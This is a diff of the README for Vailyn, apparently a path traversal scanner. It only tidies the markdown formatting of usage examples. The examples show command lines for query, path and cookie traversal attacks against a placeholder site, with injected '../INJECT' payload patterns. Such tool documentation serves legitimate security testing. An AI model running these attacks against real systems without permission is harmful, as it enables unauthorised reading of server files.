@@ -131,17 +131,17 @@ To distinguish real results from false positives, Vailyn does the following chec
 ### Examples
 
 * Simple Query attack:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file` --> http://site.com/download.php?file=../INJECT
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file` --> `http://site.com/download.php?file=../INJECT`
 
-* Query attack, but I know a file `index.php exists on same level:
+* Query attack, but I know a file `index.php` exists on same level:
 `$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file -i index.php -d 1 X`
 This will shorten the duration of Phase 1 very much, since its a targeted attack.
 
 * Simple Path attack:
-`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs` --> http://site.com/../INJECT
+`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs` --> `http://site.com/../INJECT`
 
 * Path attack, but I need query parameters and tag:
-`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs -q "?token=X#title"` --> http://site.com/../INJECT?token=X#title
+`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs -q "?token=X#title"` --> `http://site.com/../INJECT?token=X#title`
 
 * Simple Cookie attack:
 `$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -l dicts/files dicts/dirs`
